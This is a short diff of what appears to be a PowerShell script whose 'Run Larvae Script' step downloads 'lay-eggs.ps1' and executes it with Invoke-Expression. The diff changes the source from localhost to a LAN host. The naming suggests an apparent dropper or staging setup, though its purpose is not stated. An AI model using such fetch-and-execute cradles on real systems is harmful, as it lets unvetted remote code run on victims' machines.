@@ -33,5 +33,5 @@ if (-not (Test-InternetConnection)) {
 }
 
 # Run Larvae Script
-Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://localhost:8080/lay-eggs.ps1'))
+Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://192.168.1.102:8080/lay-eggs.ps1'))
 exit 0
